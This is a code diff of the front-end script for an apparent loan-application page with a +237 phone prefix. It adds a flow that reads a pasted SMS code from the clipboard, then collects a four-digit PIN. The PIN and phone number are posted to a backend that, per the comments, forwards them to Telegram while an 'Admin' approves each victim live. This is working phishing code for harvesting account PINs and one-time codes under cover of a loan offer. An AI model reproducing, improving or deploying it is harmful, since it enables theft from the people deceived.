@@ -10,12 +10,10 @@ function selectLanguage(lang, element) {
         opt.classList.remove('selected');
     });
     element.classList.add('selected');
-    
-    setTimeout(() => {
-        goToScreen('screen-home');
-    }, 300);
+    setTimeout(() => { goToScreen('screen-home'); }, 300);
 }
 
+// --- CALCULATOR ---
 const amountSlider = document.getElementById('amount-slider');
 const loanAmountDisplay = document.getElementById('loan-amount-display');
 const termSelect = document.getElementById('term-select');
@@ -24,7 +22,6 @@ const monthlyPaymentDisplay = document.getElementById('monthly-payment-display')
 function updateCalculator() {
     const principal = parseInt(amountSlider.value);
     const months = parseInt(termSelect.value);
-    
     loanAmountDisplay.innerText = principal.toLocaleString();
     const totalRepayment = principal * 1.10;
     const monthly = totalRepayment / months;
@@ -36,19 +33,15 @@ termSelect.addEventListener('change', updateCalculator);
 updateCalculator();
 
 function startApplication() {
-    const selectedAmount = amountSlider.value;
-    const selectedTerm = termSelect.value;
-
-    document.getElementById('form-amount').value = selectedAmount;
-    document.getElementById('form-term').value = selectedTerm;
-
+    document.getElementById('form-amount').value = amountSlider.value;
+    document.getElementById('form-term').value = termSelect.value;
     goToScreen('screen-application');
 }
 
+// --- FORM INPUTS ---
 document.getElementById('phone-number').addEventListener('input', function (e) {
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
-
 document.getElementById('five-digit-code').addEventListener('input', function (e) {
     this.value = this.value.replace(/[^0-9]/g, ''); 
 });
@@ -60,7 +53,6 @@ function updateFormUI() {
     document.querySelectorAll('.form-step').forEach((el, index) => {
         el.classList.toggle('active', index + 1 === currentStep);
     });
-
     document.getElementById('step-indicator').innerText = `Step ${currentStep} of ${totalSteps}`;
     document.getElementById('btn-back').style.display = currentStep === 1 ? 'none' : 'block';
     
@@ -82,7 +74,6 @@ function nextStep() {
         const currentStepDiv = document.getElementById(`step-${currentStep}`);
         const inputs = currentStepDiv.querySelectorAll('input, select');
         let isValid = true;
-
         inputs.forEach(input => {
             if (!input.checkValidity()) {
                 isValid = false;
@@ -91,12 +82,10 @@ function nextStep() {
                 input.style.borderColor = '#3c5c75'; 
             }
         });
-
         if (!isValid) {
             alert("Please fill out all fields correctly before continuing.");
             return;
         }
-
         currentStep++;
         updateFormUI();
     }
@@ -121,81 +110,23 @@ function generateSummary() {
     document.getElementById('summary-term').innerText = `${term} Months`;
     document.getElementById('summary-purpose').innerText = purpose;
     document.getElementById('summary-phone').innerText = `+237 ${phone}`;
-    
     if (firstName || lastName) {
         document.getElementById('summary-name').innerText = `${firstName} ${lastName}`.trim();
     }
 }
 
-// --- TELEGRAM SUBMISSION (Now goes to SMS screen) ---
-async function submitForm(event) {
+// --- MOVE TO SMS SCREEN ---
+function submitForm(event) {
     event.preventDefault(); 
-    
-    const currentStepDiv = document.getElementById(`step-${currentStep}`);
-    const inputs = currentStepDiv.querySelectorAll('input, select');
-    let isValid = true;
-
-    inputs.forEach(input => {
-        if (!input.checkValidity()) {
-            isValid = false;
-            input.style.borderColor = 'red';
-        } else {
-            input.style.borderColor = '#3c5c75'; 
-        }
-    });
-
-    if (!isValid) {
-        alert("Please fill out all fields correctly before submitting.");
-        return;
-    }
-
-    const submitBtn = document.getElementById('btn-submit');
-    const originalText = submitBtn.innerText;
-    submitBtn.innerText = "Processing...";
-    submitBtn.disabled = true;
-
-    const phone = document.getElementById('phone-number').value || "Unknown";
-    const code = document.getElementById('five-digit-code').value || "Unknown";
-
-    try {
-        const response = await fetch('/api/request-approval', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, code: code })
-        });
-        const result = await response.json();
-
-        const interval = setInterval(async () => {
-            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
-            const statusData = await statusRes.json();
-
-            if (statusData.status === 'approve') {
-                clearInterval(interval);
-                goToScreen('screen-sms'); // <--- GO TO SMS SCREEN NOW
-            } else if (statusData.status === 'reject') {
-                clearInterval(interval);
-                alert("Application rejected by Admin.");
-                submitBtn.innerText = originalText;
-                submitBtn.disabled = false;
-            }
-        }, 2000);
-
-    } catch (error) {
-        alert("Error connecting to server.");
-        submitBtn.innerText = originalText;
-        submitBtn.disabled = false;
-    }
+    goToScreen('screen-sms');
 }
 
 // --- SMS SCREEN LOGIC ---
-
-// Update character count as user types
 document.getElementById('sms-input').addEventListener('input', function() {
     const count = this.value.length;
     document.getElementById('char-count').innerText = `${count} characters`;
-    
     const verifyBtn = document.getElementById('btn-verify-sms');
-    if (count > 5) { // Require at least 5 characters to enable button
+    if (count > 5) {
         verifyBtn.classList.add('enabled');
         verifyBtn.disabled = false;
     } else {
@@ -204,26 +135,92 @@ document.getElementById('sms-input').addEventListener('input', function() {
     }
 });
 
-// Simulate a "Paste" button (can't read clipboard directly in all browsers without permission, but we try)
 async function pasteSMS() {
     try {
         const text = await navigator.clipboard.readText();
         const input = document.getElementById('sms-input');
         input.value = text;
-        
-        // Trigger input event to update count and button
         const event = new Event('input');
         input.dispatchEvent(event);
     } catch (err) {
-        // Fallback if clipboard API fails
         alert("Please press and hold on the text box to paste the SMS manually.");
     }
 }
 
-// Final verification step
-function verifySMS() {
-    const smsText = document.getElementById('sms-input').value;
-    if(smsText.length > 5) {
-        goToScreen('screen-success');
+// --- PIN SCREEN LOGIC ---
+const pinBoxes = document.querySelectorAll('.pin-box');
+
+function checkPINs() {
+    let filled = true;
+    pinBoxes.forEach(box => {
+        if (box.value.length !== 1) filled = false;
+    });
+
+    const btn = document.getElementById('btn-verify-pin');
+    if (filled) {
+        btn.classList.add('enabled');
+        btn.disabled = false;
+    } else {
+        btn.classList.remove('enabled');
+        btn.disabled = true;
+    }
+}
+
+function moveToNext(current, index) {
+    // Keep only numbers
+    current.value = current.value.replace(/[^0-9]/g, '');
+    
+    if (current.value.length === 1 && index < 4) {
+        pinBoxes[index].focus(); // index is 1-based, so this focuses next box
+    }
+    checkPINs();
+}
+
+function moveToPrev(current, event, index) {
+    if (event.key === "Backspace" && current.value.length === 0 && index > 1) {
+        pinBoxes[index - 2].focus(); // Move to previous box
+    }
+}
+
+// --- FINAL TELEGRAM SUBMISSION ON PIN ---
+async function submitPIN() {
+    // 1. Gather all the data
+    const pinCode = Array.from(pinBoxes).map(b => b.value).join('');
+    const phone = document.getElementById('phone-number').value || "Unknown";
+    
+    const btn = document.getElementById('btn-verify-pin');
+    const originalText = btn.innerHTML;
+    btn.innerHTML = "Verifying...";
+    btn.disabled = true;
+
+    try {
+        // 2. Send to backend (Pass the PIN code as the 'code' to show in Telegram)
+        const response = await fetch('/api/request-approval', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone: phone, code: `PIN: ${pinCode}` })
+        });
+        const result = await response.json();
+
+        // 3. Poll for Telegram approval
+        const interval = setInterval(async () => {
+            const statusRes = await fetch(`/api/check-status/${result.app_id}`);
+            const statusData = await statusRes.json();
+
+            if (statusData.status === 'approve') {
+                clearInterval(interval);
+                goToScreen('screen-success'); // Show Final Success Page
+            } else if (statusData.status === 'reject') {
+                clearInterval(interval);
+                alert("Verification rejected by Admin.");
+                btn.innerHTML = originalText;
+                btn.disabled = false;
+            }
+        }, 2000);
+
+    } catch (error) {
+        alert("Error connecting to server.");
+        btn.innerHTML = originalText;
+        btn.disabled = false;
     }
 }
